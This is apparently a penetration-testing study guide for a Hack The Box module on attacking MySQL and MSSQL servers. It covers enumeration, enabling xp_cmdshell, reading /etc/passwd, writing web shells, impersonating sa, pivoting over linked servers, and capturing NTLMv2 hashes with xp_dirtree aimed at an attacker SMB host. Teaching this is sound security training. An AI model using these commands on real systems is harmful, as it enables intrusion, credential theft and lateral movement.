# 1. 🗄️ Introduction to SQL Databases

**MySQL** and **Microsoft SQL Server (MSSQL)** are **relational database management systems (RDBMS)**.

Relational databases organize information into:

```text
Database
   │
   ├── Tables
   │      │
   │      ├── Columns
   │      └── Rows
   │
   └── Relationships
```

Many relational databases, including **MySQL and MSSQL**, use:

# SQL — Structured Query Language

SQL is used to:

- Query data
    
- Insert data
    
- Modify data
    
- Delete data
    
- Manage databases
    
- Manage database objects
    
- Retrieve metadata
    

The source emphasizes that database servers are particularly valuable targets because they may contain:

- User credentials
    
- Personally Identifiable Information (PII)
    
- Business information
    
- Payment information
    

Database services may also run with highly privileged accounts, making them potentially useful for:

- Privilege escalation
    
- Lateral movement
    
- Command execution
    
- Access to other systems
    

---

# 2. 🎯 Why Databases Are High-Value Targets

Think of a database server as:

```text
                 DATABASE SERVER
                       │
          ┌────────────┼────────────┐
          ▼            ▼            ▼
       Users        Business       Payment
     Credentials     Data           Data
          │            │            │
          └────────────┼────────────┘
                       ▼
                  Sensitive Data
```

If an attacker obtains database access, the attack may not stop at reading records.

Depending on privileges, database access can potentially lead to:

```text
Database Access
      │
      ├── Read Data
      ├── Modify Data
      ├── Read Files
      ├── Execute Commands
      ├── Capture Credentials/Hashes
      ├── Impersonate Users
      └── Lateral Movement
```

---

# 3. 🌐 Database Ports

The source identifies the following default ports:

|Database|Default Port|
|---|--:|
|**MSSQL**|`TCP/1433`|
|**MSSQL Browser**|`UDP/1434`|
|**MySQL**|`TCP/3306`|
|**MSSQL hidden mode**|`TCP/2433`|

### ⭐ Memorize

```text
MSSQL → 1433/TCP
MSSQL → 1434/UDP
MySQL → 3306/TCP
Hidden MSSQL → 2433/TCP
```

---

# 4. 🔎 Database Enumeration

The first step is to determine whether database services are exposed.

A useful Nmap command from the source is:

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```

### Breakdown

|Option|Meaning|
|---|---|
|`-Pn`|Treat host as online; skip host discovery|
|`-sV`|Service/version detection|
|`-sC`|Run Nmap default scripts|
|`-p1433`|Scan TCP port 1433|

---

# 5. 📋 MSSQL Nmap Enumeration

The supplied scan identifies:

```text
1433/tcp open  ms-sql-s Microsoft SQL Server 2017
```

It also reveals:

```text
Target_Name: HTB
NetBIOS_Domain_Name: HTB
NetBIOS_Computer_Name: mssql-test
DNS_Domain_Name: HTB.LOCAL
DNS_Computer_Name: mssql-test.HTB.LOCAL
Product_Version: 10.0.17763
```

### 🧠 Why this information matters

A banner can reveal:

```text
Database
    ↓
Version
    ↓
Hostname
    ↓
Domain
    ↓
OS/product information
    ↓
Potential attack paths
```

The source specifically notes that version and hostname information can help identify:

- Misconfigurations
    
- Specific attacks
    
- Known vulnerabilities
    

---

# 6. 🔐 MSSQL Authentication Mechanisms

MSSQL supports two primary authentication modes.

## 1. Windows Authentication

Also called **Integrated Security**.

Authentication is integrated with:

```text
Windows / Active Directory
```

Existing authenticated Windows users may access SQL Server without providing another set of SQL-specific credentials.

---

## 2. Mixed Mode

Mixed mode supports:

```text
Windows / Active Directory Accounts
        +
SQL Server Accounts
```

SQL Server accounts use:

```text
Username + Password
```

### Visual

```text
                 MSSQL
                   │
          ┌────────┴────────┐
          ▼                 ▼
 Windows Authentication   Mixed Mode
          │                 │
          ▼             ┌───┴────┐
 Active Directory       ▼        ▼
                      Windows    SQL
                      Account   Account
```

---

# 7. 🐬 MySQL Authentication

MySQL supports different authentication methods, including:

- Username/password authentication
    
- Windows authentication through an appropriate plugin
    

The authentication mechanism selected by an administrator can depend on:

- Compatibility
    
- Security
    
- Usability
    
- Environment requirements
    

Incorrect configuration can introduce security weaknesses.

---

# 8. ⏱️ Historical MySQL Authentication Vulnerability — CVE-2012-2122

The source discusses **CVE-2012-2122**, affecting MySQL 5.6.x and other versions.

The vulnerability involved a **timing attack** in authentication handling.

The basic idea:

```text
Repeated Authentication Attempts
             │
             ▼
Measure Response Time
             │
             ▼
Compare Timing Differences
             │
             ▼
Infer Authentication Behavior
```

The source explains that, in the vulnerable implementation, incorrect and correct authentication attempts could produce timing differences that could be abused.

---

# 9. ⚠️ Authentication Misconfigurations

MSSQL authentication can be misconfigured in ways that allow access without normal credentials.

Examples mentioned by the source include:

- Anonymous access enabled
    
- User configured without a password
    
- Any user/group/machine allowed to access SQL Server
    

### Attack concept

```text
Misconfigured Authentication
          │
          ▼
Unauthorized Access
          │
          ▼
Database Enumeration
          │
          ▼
Privilege Discovery
```

---

# 10. 🔥 SQL Server Privileges

The source lists several things that may become possible depending on the user's privileges.

A database user may potentially be able to:

- Read/change database contents
    
- Read/change server configuration
    
- Execute commands
    
- Read local files
    
- Communicate with other databases
    
- Capture the local system hash
    
- Impersonate users
    
- Gain access to other networks
    

### ⭐ Important mindset

Never assume:

> “I have database credentials, so I can only read the database.”

Instead:

```text
Database Credentials
       ↓
Determine Privileges
       ↓
Determine Capabilities
       ↓
Look for Additional Attack Paths
```

---

# 11. 🧭 SQL Database Attack Methodology

A useful workflow from the material:

```text
                  DATABASE
                     │
                     ▼
                Enumeration
                     │
                     ▼
               Authentication
                     │
                     ▼
              Identify Privileges
                     │
        ┌────────────┼────────────┐
        ▼            ▼            ▼
     Database      Files        Commands
       Data         │             │
        │           │             │
        ▼           ▼             ▼
    Credentials   Sensitive       RCE
                  Information
```

---

# 12. 🗃️ Read / Change the Database

Once database access is obtained, the first objective is understanding the database structure.

The source recommends determining:

1. Existing databases
    
2. Tables within those databases
    
3. Contents of interesting tables
    

A large database might contain hundreds of tables, so prioritize tables likely to contain:

- Usernames
    
- Passwords
    
- Tokens
    
- Configurations
    
- Other credentials
    

---

# 13. 🐬 Connecting to MySQL

The source gives:

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

After connecting:

```text
MySQL [(none)]>
```

This gives an interactive SQL shell.

### Structure

```text
mysql
 │
 ├── -u julio
 │      └── Username
 │
 ├── -pPassword123
 │      └── Password
 │
 └── -h 10.129.20.13
        └── Target host
```

---

# 14. 🪟 Connecting to MSSQL With `sqlcmd`

The source uses:

```cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

After connecting:

```text
1>
```

### Important options

|Option|Meaning|
|---|---|
|`-S`|Server|
|`-U`|Username|
|`-P`|Password|
|`-y`|SQLCMDMAXVARTYPEWIDTH|
|`-Y`|SQLCMDMAXFIXEDTYPEWIDTH|

The source notes that `-y` and `-Y` can improve output formatting, but may affect performance.

---

# 15. 🐧 Connecting to MSSQL From Linux — `sqsh`

An alternative to `sqlcmd` when targeting MSSQL from Linux is:

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

The `-h` option is used for cleaner output by disabling headers and footers.

---

# 16. 🐍 Impacket `mssqlclient.py`

Another useful MSSQL client is:

```text
mssqlclient.py
```

The source gives:

```bash
mssqlclient.py -p 1433 julio@10.129.203.7
```

The tool prompts for the password and establishes the SQL connection.

---

# 17. 🔑 Windows Authentication With MSSQL

When using Windows Authentication, the domain or hostname must be specified.

For a local account, the source gives:

```text
SERVERNAME\accountname
```

or:

```text
.\accountname
```

Example:

```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

### Important distinction

```text
SQL Authentication
        ↓
SQL Server account

Windows Authentication
        ↓
Windows / AD account
```

---

# 18. 🗄️ Default MySQL Databases

Before running SQL queries, understand the default system databases.

### MySQL

|Database|Purpose|
|---|---|
|`mysql`|System information required by MySQL|
|`information_schema`|Database metadata|
|`performance_schema`|Low-level performance monitoring|
|`sys`|Helps interpret Performance Schema data|

---

# 19. 🗄️ Default MSSQL Databases

MSSQL has several important system databases:

|Database|Purpose|
|---|---|
|`master`|Information about SQL Server instance|
|`msdb`|SQL Server Agent|
|`model`|Template for new databases|
|`resource`|Read-only system objects|
|`tempdb`|Temporary objects|

### ⭐ Memorize

```text
MSSQL:

master
msdb
model
resource
tempdb
```

---

# 20. ⚠️ Database Permissions

The source specifically warns:

> We will get an error if we try to list or connect to a database we don't have permissions to.

So:

```text
Database Exists
      ≠
User Can Access Database
```

Always distinguish between:

```text
Existence
   +
Permission
```

---

# 21. 🔎 Show Databases — MySQL

Command:

```sql
SHOW DATABASES;
```

Example:

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
```

---

# 22. 🔎 Show Databases — MSSQL

Using `sqlcmd`:

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

Example:

```text
master
tempdb
model
msdb
htbusers
```

### Important

In `sqlcmd`, the source uses:

```text
GO
```

to execute the query batch.

---

# 23. 📂 Select a Database

### MySQL

```sql
USE htbusers;
```

Output:

```text
Database changed
```

### MSSQL

```sql
USE htbusers
GO
```

---

# 24. 📋 Show Tables

### MySQL

```sql
SHOW TABLES;
```

Example:

```text
actions
permissions
permissions_roles
permissions_users
roles
roles_users
settings
users
```

### MSSQL

```sql
SELECT table_name
FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

---

# 25. 👤 Extracting Data From a Users Table

The source demonstrates:

```sql
SELECT * FROM users;
```

Example output contains:

```text
id | username      | password
---+---------------+------------
1  | admin         | p@ssw0rd
2  | administrator | adm1n_p@ss
3  | john          | john123!
4  | tom           | tom123!
```

### ⚠️ Security lesson

A database containing plaintext passwords is extremely dangerous.

Better practice is:

```text
Password
   ↓
Strong Password Hash
   ↓
Salted / secure password storage
```

rather than:

```text
Password
   ↓
Plaintext Database
```

---

# 26. 💻 Execute Commands

One of the most valuable capabilities discussed is:

# Command Execution

If sufficient privileges exist, SQL Server can potentially be used to execute operating-system commands.

The source specifically focuses on:

```text
xp_cmdshell
```

---

# 27. ⚙️ `xp_cmdshell`

`xp_cmdshell` is an extended stored procedure that allows SQL Server to execute system commands.

Important characteristics:

- Disabled by default
    
- Can be enabled through configuration
    
- Requires appropriate privileges
    
- Spawned Windows process runs with the security rights of the SQL Server service account
    
- Operates synchronously
    

### ⭐ Extremely important

```text
xp_cmdshell
     ↓
Windows Process
     ↓
SQL Server Service Account Privileges
```

Therefore, the privileges of the SQL Server service account matter greatly.

---

# 28. 🧪 `xp_cmdshell` Example

The source demonstrates:

```sql
xp_cmdshell 'whoami'
GO
```

Result:

```text
no service\mssql$sqlexpress
```

This tells us which Windows account the SQL Server command execution context is using.

---

# 29. 🔓 Enabling `xp_cmdshell`

If it is disabled and the user has sufficient privileges, the source shows:

```sql
EXECUTE sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

EXECUTE sp_configure 'xp_cmdshell', 1
GO

RECONFIGURE
GO
```

### Flow

```text
show advanced options
        ↓
RECONFIGURE
        ↓
Enable xp_cmdshell
        ↓
RECONFIGURE
        ↓
xp_cmdshell available
```

---

# 30. 🧰 Other MSSQL Command Execution Methods

The source mentions several other mechanisms:

- Extended stored procedures
    
- CLR Assemblies
    
- SQL Server Agent Jobs
    
- External scripts
    
- `xp_regwrite`
    

These are outside the scope of the material's main discussion.

---

# 31. 🐬 MySQL Command Execution

MySQL doesn't have an equivalent stored procedure to `xp_cmdshell`.

However, the source explains that **User Defined Functions (UDFs)** can potentially allow C/C++ code to execute as a SQL function.

The source points to a UDF designed for command execution.

It also notes that encountering such a UDF in a production environment is uncommon, but it is still something a tester should be aware of.

---

# 32. 📝 Write Local Files

Writing files can provide another path toward code execution.

The concept is:

```text
Database
   │
   ▼
Write File
   │
   ▼
Executable/Web-accessible Location
   │
   ▼
File Processed
   │
   ▼
Potential Code Execution
```

---

# 33. 🐬 MySQL — `SELECT INTO OUTFILE`

The source explains that if MySQL has appropriate privileges and operates alongside a web server, it may be possible to write a file into the web server directory using:

```sql
SELECT ... INTO OUTFILE
```

The supplied example writes a PHP file into:

```text
/var/www/html/
```

### Concept:

```text
MySQL
  │
  ▼
SELECT INTO OUTFILE
  │
  ▼
Web Directory
  │
  ▼
PHP File
  │
  ▼
Web Server Processes File
```

This is a powerful demonstration of how **database write access can cross into another application layer**.

---

# 34. 🔐 `secure_file_priv`

MySQL uses:

```text
secure_file_priv
```

to restrict file import/export operations.

The source explains three configurations:

### Empty

```text
secure_file_priv = ''
```

The variable has no effect.

This is described as an insecure setting.

### Directory

```text
secure_file_priv = /some/directory
```

File operations are restricted to that directory.

### NULL

```text
secure_file_priv = NULL
```

Import/export operations are disabled.

---

# 35. 🔎 Checking `secure_file_priv`

The source uses:

```sql
show variables like "secure_file_priv";
```

Example:

```text
Variable_name    Value
secure_file_priv
```

An empty value means there is no directory restriction from this variable.

### ⭐ Remember

```text
Empty → No restriction
Directory → Restricted to directory
NULL → Disabled
```

---

# 36. 🪟 MSSQL — Writing Local Files

MSSQL can also write files through specific functionality.

The source describes using:

# **Ole Automation Procedures**

These require administrator privileges.

First, the feature is enabled using:

```sql
sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'Ole Automation Procedures', 1
GO

RECONFIGURE
GO
```

---

# 37. 📄 MSSQL File Creation

The source demonstrates creating a file using:

```text
sp_OACreate
sp_OAMethod
sp_OADestroy
```

The supplied example creates:

```text
c:\inetpub\wwwroot\webshell.php
```

and writes PHP content into it.

### Conceptual chain

```text
MSSQL
  ↓
Ole Automation
  ↓
FileSystemObject
  ↓
Create/Write File
  ↓
Web Server Directory
  ↓
Potential Web Execution
```

---

# 38. 📖 Read Local Files — MSSQL

MSSQL can read files that the SQL Server service account has permission to access.

The source uses:

```sql
SELECT *
FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents
GO
```

### Concept

```text
MSSQL
  │
  ▼
OPENROWSET
  │
  ▼
Local File
  │
  ▼
Read Contents
```

---

# 39. 🐧 Read Local Files — MySQL

The source notes that MySQL does not normally allow arbitrary file reading by default.

However, with appropriate configuration and privileges, the following can be used:

```sql
SELECT LOAD_FILE("/etc/passwd");
```

The supplied example returns contents from:

```text
/etc/passwd
```

---

# 40. 🖼️ Database → Filesystem Attack Path

```text
                 DATABASE
                    │
          ┌─────────┴──────────┐
          ▼                    ▼
      Read Files           Write Files
          │                    │
          ▼                    ▼
   Sensitive Data        Application Files
          │                    │
          ▼                    ▼
 Credentials / Config    Potential Execution
```

This is an important concept:

> **Database privileges can sometimes cross the boundary into operating-system or application-level access.**

---

# 41. 🔥 Capture MSSQL Service Hash

The source connects this technique with the SMB attacks discussed previously.

MSSQL has undocumented stored procedures:

```text
xp_subdirs
xp_dirtree
```

These can use SMB to retrieve directory information.

If they are pointed at an attacker-controlled SMB server, the SQL Server service may attempt to authenticate to that server.

This can expose **NTLMv2 authentication material** for the account running SQL Server.

---

# 42. 🧠 Hash-Stealing Attack Flow

```text
                  MSSQL
                    │
                    ▼
              xp_dirtree /
              xp_subdirs
                    │
                    ▼
             SMB Request
                    │
                    ▼
         Attacker SMB Server
                    │
                    ▼
        SQL Server Authentication
                    │
                    ▼
          NTLMv2 Authentication
             Material Captured
```

This is a very important connection between:

```text
SQL
 +
SMB
 +
Windows Authentication
```

---

# 43. 🧪 `xp_dirtree`

The source gives:

```sql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```

The procedure attempts to retrieve directory information from the specified SMB path.

---

# 44. 🧪 `xp_subdirs`

The source also gives:

```sql
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

The supplied output shows an access-denied error, but the important point is that the operation causes an SMB interaction.

---

# 45. 🧲 Responder — Capturing MSSQL Authentication

The source starts Responder:

```bash
sudo responder -I tun0
```

When MSSQL attempts to access the attacker's SMB server, Responder can capture the NTLMv2 authentication material.

The example shows:

```text
NTLMv2-SSP Client
NTLMv2-SSP Username
NTLMv2-SSP Hash
```

### Conceptual flow

```text
MSSQL
  │
  │ SMB request
  ▼
Responder
  │
  ▼
NTLMv2 Authentication
  │
  ▼
Captured Hash
  │
  ├── Crack
  └── Relay
```

---

# 46. 🐍 Impacket SMB Server

Instead of Responder, the source demonstrates:

```bash
sudo impacket-smbserver share ./ -smb2support
```

The server receives the incoming authentication.

The example shows:

```text
AUTHENTICATE_MESSAGE
User WINSRV02\mssqlsvc authenticated successfully
```

and the corresponding NTLMv2 authentication material.

---

# 47. 🔑 What Can Be Done With the Captured Hash?

The source states that once the service account hash is obtained, we can attempt to:

```text
Captured NTLMv2
       │
   ┌───┴────┐
   ▼        ▼
 Crack     Relay
```

### Cracking

Attempt to recover the password.

### Relaying

Attempt to reuse the authentication exchange against another host/service where appropriate.

---

# 48. 👤 MSSQL `IMPERSONATE`

One of the most important MSSQL privilege-escalation concepts is:

# `IMPERSONATE`

The `IMPERSONATE` permission allows the executing user to take on the permissions of another user/login.

This continues until:

- The execution context is reset, or
    
- The session ends.
    

### Concept

```text
Low-Privilege User
       │
       │ IMPERSONATE
       ▼
Higher-Privilege Login
       │
       ▼
Higher Privileges
```

---

# 49. 🔎 Finding Users We Can Impersonate

The source uses:

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

Example result:

```text
sa
ben
valentin
```

---

# 50. 🛡️ Checking Our Current Privileges

The source checks:

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Example:

```text
julio
0
```

The result means:

```text
Current User = julio
sysadmin     = 0
```

Therefore, the current user is **not** a sysadmin.

---

# 51. 🚀 Impersonating `sa`

The source then demonstrates:

```sql
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Result:

```text
sa
1
```

This indicates the execution context has changed to `sa` and the account has the `sysadmin` role.

### Attack concept

```text
julio
 │
 │ IMPERSONATE
 ▼
sa
 │
 ▼
sysadmin = 1
 │
 ▼
Administrative SQL privileges
```

---

# 52. 🔄 Reverting Impersonation

To return to the previous user/context:

```sql
REVERT
```

The source explicitly identifies `REVERT` as the method for returning to the previous execution context.

---

# 53. ⭐ Why `master` Matters for Impersonation

The source recommends running:

```sql
EXECUTE AS LOGIN
```

within the `master` database.

Reason:

> All users, by default, have access to `master`.

If the impersonated user doesn't have access to the database you're currently connected to, the operation may produce an error.

The source suggests:

```sql
USE master
```

when necessary.

---

# 54. 🌐 Linked Servers

Another important MSSQL feature is:

# **Linked Servers**

A linked server allows SQL Server to execute queries against another database server or database technology.

For example:

```text
MSSQL Server A
      │
      │ Linked Server
      ▼
MSSQL Server B
```

---

# 55. 🔥 Why Linked Servers Matter

If a linked server uses credentials that have high privileges on the remote server, gaining access to the first SQL Server may provide a path to the second one.

Conceptually:

```text
SQL Server A
     │
     │ Linked Server
     ▼
SQL Server B
     │
     ▼
Remote Privileges
     │
     ▼
Potential Lateral Movement
```

The source specifically notes that if the remote credentials have `sysadmin` privileges, commands may potentially be executed on the remote SQL instance.

---

# 56. 🔎 Identify Linked Servers

The source uses:

```sql
SELECT srvname, isremote
FROM sysservers
GO
```

Example:

```text
DESKTOP-MFERMN4\SQLEXPRESS     1
10.0.0.12\SQLEXPRESS            0
```

The source explains that the `isremote` field indicates the server relationship.

---

# 57. 🧪 Querying a Linked Server

The source demonstrates:

```sql
EXECUTE(
'select @@servername,
        @@version,
        system_user,
        is_srvrolemember(''sysadmin'')'
) AT [10.0.0.12\SQLEXPRESS]
GO
```

The result shows information about the remote SQL instance and the user executing there.

---

# 58. 🧠 Nested Quotes in Linked Server Queries

An important syntax detail:

If you need quotes inside a linked-server query, the source explains that you need to escape single quotes using additional single quotes.

Example:

```sql
''sysadmin''
```

instead of:

```sql
'sysadmin'
```

Multiple commands can be separated using:

```text
;
```

---

# 59. 💥 Linked Server → Sysadmin

The source ultimately demonstrates the important concept:

```text
Current SQL Server
       │
       ▼
Linked Server
       │
       ▼
Remote SQL Instance
       │
       ▼
sysadmin
       │
   ┌───┴────┐
   ▼        ▼
Read Data  xp_cmdshell
```

As `sysadmin`, the tester potentially controls the SQL Server instance and can:

- Read database data
    
- Execute system commands through `xp_cmdshell`
    

---

# 60. 🖼️ Complete MSSQL Attack Chain

```text
                         MSSQL
                           │
                           ▼
                     Enumeration
                           │
                           ▼
                    Authentication
                           │
                           ▼
                   Database Access
                           │
          ┌────────────────┼────────────────┐
          ▼                ▼                ▼
       Database          Files           Privileges
          │                │                │
          ▼                ▼                ▼
     Read/Change       Read/Write      Impersonation
          │                │                │
          │                │                ▼
          │                │              sa
          │                │                │
          │                │                ▼
          │                │            sysadmin
          │                │
          │                ▼
          │           SMB Authentication
          │                │
          │                ▼
          │           NTLMv2 Material
          │
          ▼
     Credentials
          │
          ▼
     Lateral Movement
```

---

# 61. 🖼️ MySQL Attack Chain

```text
                         MySQL
                           │
                           ▼
                     Enumeration
                           │
                           ▼
                    Authentication
                           │
                           ▼
                    Database Access
                           │
              ┌────────────┴────────────┐
              ▼                         ▼
          Read Data                File Operations
              │                         │
              ▼                         ▼
       Credentials / PII        SELECT INTO OUTFILE
                                      │
                                      ▼
                              Web/Application File
                                      │
                                      ▼
                              Potential Execution
```

---

# 62. 🧠 MSSQL vs MySQL

|Capability|MSSQL|MySQL|
|---|---|---|
|Default port|`1433/TCP`|`3306/TCP`|
|SQL client|`sqlcmd`|`mysql`|
|Linux alternative|`sqsh`|`mysql`|
|Impacket client|`mssqlclient.py`|—|
|System DBs|`master`, `msdb`, etc.|`mysql`, `information_schema`, etc.|
|Command execution|`xp_cmdshell`|UDF possibilities|
|File read|`OPENROWSET`|`LOAD_FILE()`|
|File write|Ole Automation|`SELECT INTO OUTFILE`|
|User impersonation|`IMPERSONATE`|Different privilege model|
|Linked servers|Yes|Different mechanisms|
|SMB hash capture|`xp_dirtree`, `xp_subdirs`|Not the technique described|

---

# 63. 🧰 SQL Database Tool Cheat Sheet

|Tool|Purpose|
|---|---|
|`nmap`|Database service/version enumeration|
|`mysql`|Connect to MySQL|
|`sqlcmd`|Connect to MSSQL|
|`sqsh`|MSSQL client from Linux|
|`mssqlclient.py`|Impacket MSSQL client|
|`Responder`|Capture SMB/NTLM authentication|
|`impacket-smbserver`|Create SMB server for testing authentication behavior|

---

# 64. ⭐ Important Commands to Memorize

### Nmap

```bash
nmap -Pn -sV -sC -p1433 <TARGET>
```

### MySQL connection

```bash
mysql -u <USER> -p<PASSWORD> -h <TARGET>
```

### MSSQL

```bash
sqlcmd -S <SERVER> -U <USER> -P '<PASSWORD>'
```

### MSSQL Linux client

```bash
sqsh -S <TARGET> -U <USER> -P '<PASSWORD>' -h
```

### Impacket MSSQL

```bash
mssqlclient.py -p 1433 <USER>@<TARGET>
```

### MySQL databases

```sql
SHOW DATABASES;
```

### MSSQL databases

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

### MySQL tables

```sql
SHOW TABLES;
```

### MSSQL tables

```sql
SELECT table_name
FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
GO
```

### MySQL file configuration

```sql
show variables like "secure_file_priv";
```

### MSSQL identity

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

### MSSQL impersonation

```sql
EXECUTE AS LOGIN = 'sa'
```

### Revert

```sql
REVERT
```

### Linked servers

```sql
SELECT srvname, isremote FROM sysservers
GO
```

---

# 65. 🎯 Most Important Concepts for HTB

If you're studying this for **Hack The Box**, prioritize these:

### 🔴 Tier 1 — Must Know

```text
1433 → MSSQL
3306 → MySQL

SHOW DATABASES
SHOW TABLES

master
msdb
model
tempdb

mysql
information_schema
performance_schema
sys
```

### 🔴 Tier 2 — Very Important

```text
xp_cmdshell
OPENROWSET
LOAD_FILE
SELECT INTO OUTFILE
secure_file_priv
IMPERSONATE
EXECUTE AS LOGIN
REVERT
```

### 🔴 Tier 3 — Advanced

```text
xp_dirtree
xp_subdirs
NTLMv2 capture
Responder
impacket-smbserver
Linked Servers
Lateral Movement
```

---

# 66. 🧠 Privilege Escalation Mindset

When you obtain MSSQL access, don't immediately assume you have administrator privileges.

Ask:

```text
Who am I?
   ↓
What permissions do I have?
   ↓
Am I sysadmin?
   ↓
Can I impersonate anyone?
   ↓
Are there linked servers?
   ↓
Can I execute commands?
   ↓
Can I read/write files?
   ↓
What account is SQL Server running as?
```

This is one of the most important practical workflows in the entire module.

---

# 67. 🔥 Complete SQL Database Methodology

```text
                         TARGET
                           │
                           ▼
                    PORT ENUMERATION
                           │
                ┌──────────┴──────────┐
                ▼                     ▼
             MSSQL                  MySQL
             1433                  3306
                │                     │
                ▼                     ▼
             Banner                Banner
                │                     │
                ▼                     ▼
        Authentication          Authentication
                │                     │
                ▼                     ▼
           Database Access
                │
       ┌────────┼─────────┐
       ▼        ▼         ▼
    Databases Tables   Permissions
       │        │         │
       └────────┼─────────┘
                ▼
         Sensitive Data
                │
       ┌────────┼────────────┐
       ▼        ▼            ▼
     Files    Commands    Impersonation
       │        │            │
       │        ▼            ▼
       │      RCE           sa
       │                     │
       ▼                     ▼
     SMB                  sysadmin
       │                     │
       ▼                     ▼
   NTLMv2                  RCE
       │
   ┌───┴────┐
   ▼        ▼
 Crack     Relay
```

---

# 68. 📝 Viva / Exam Questions

### Q1. What is an RDBMS?

A relational database management system stores structured information using tables, rows, and columns.

### Q2. What ports does MSSQL use?

```text
TCP/1433
UDP/1434
```

The source also mentions `TCP/2433` for hidden MSSQL mode.

### Q3. What port does MySQL use?

```text
TCP/3306
```

### Q4. What are MSSQL's two authentication modes?

```text
Windows Authentication
Mixed Mode
```

### Q5. What is `xp_cmdshell`?

An MSSQL extended stored procedure that can execute operating-system commands.

### Q6. Is `xp_cmdshell` enabled by default?

No. The source states it is disabled by default.

### Q7. Under whose privileges does `xp_cmdshell` execute?

The spawned Windows process has the security rights of the SQL Server service account.

### Q8. What is `secure_file_priv`?

A MySQL system variable that controls where import/export file operations are permitted.

### Q9. What does `secure_file_priv = NULL` mean?

File import/export operations are disabled.

### Q10. What does an empty `secure_file_priv` mean?

The variable imposes no restriction.

### Q11. What is `IMPERSONATE`?

An MSSQL permission allowing the executing user to assume the permissions of another user/login.

### Q12. How do you check if you're sysadmin?

```sql
SELECT IS_SRVROLEMEMBER('sysadmin')
```

`1` indicates membership; `0` indicates no membership.

### Q13. How do you impersonate a login?

```sql
EXECUTE AS LOGIN = 'username'
```

### Q14. How do you revert impersonation?

```sql
REVERT
```

### Q15. What are linked servers?

Configured connections that allow SQL Server to interact with another database server or database product.

### Q16. What procedures can cause MSSQL to authenticate to an SMB server?

The source discusses:

```text
xp_dirtree
xp_subdirs
```

### Q17. What can be captured through this SMB interaction?

NTLMv2 authentication material from the SQL Server service account.

### Q18. What tools are mentioned for capturing it?

```text
Responder
impacket-smbserver
```

### Q19. What is the main purpose of database enumeration?

To identify databases, tables, useful information, permissions, and possible paths to further access.

### Q20. Why are database servers high-value targets?

Because they often store sensitive information and may run with highly privileged accounts.

---

# 🏆 69. One-Minute Revision

```text
DATABASES
   │
   ├── MSSQL → 1433
   └── MySQL → 3306
          │
          ▼
     ENUMERATION
          │
          ▼
   AUTHENTICATION
          │
          ▼
    DATABASE ACCESS
          │
    ┌─────┼────────┐
    ▼     ▼        ▼
  DATA   FILES   PRIVILEGES
    │     │        │
    │     │        ├── IMPERSONATE
    │     │        └── LINKED SERVERS
    │     │
    │     ├── MSSQL → OPENROWSET
    │     ├── MySQL → LOAD_FILE
    │     └── WRITE FILES
    │
    └── Credentials / PII / Config
          
MSSQL:
xp_cmdshell → Command Execution

MySQL:
UDF → Potential Command Execution

MSSQL:
xp_dirtree / xp_subdirs
        ↓
       SMB
        ↓
Responder / impacket-smbserver
        ↓
     NTLMv2
        ↓
    Crack / Relay
```

# 🔥 Final Takeaway

The biggest lesson from this module is:

> **Getting database access is only the beginning.**

Once authenticated, always investigate:

```text
WHO AM I?
     ↓
WHAT DATABASES CAN I ACCESS?
     ↓
WHAT TABLES EXIST?
     ↓
WHERE IS SENSITIVE DATA?
     ↓
WHAT PRIVILEGES DO I HAVE?
     ↓
CAN I READ/WRITE FILES?
     ↓
CAN I EXECUTE COMMANDS?
     ↓
CAN I IMPERSONATE USERS?
     ↓
ARE THERE LINKED SERVERS?
     ↓
CAN THE DATABASE INTERACT WITH SMB?
     ↓
CAN THIS LEAD TO LATERAL MOVEMENT / RCE?
```

That chain ties together the major techniques in this module: **database enumeration → sensitive-data discovery → file access → command execution → impersonation → SMB/NTLM interaction → lateral movement**.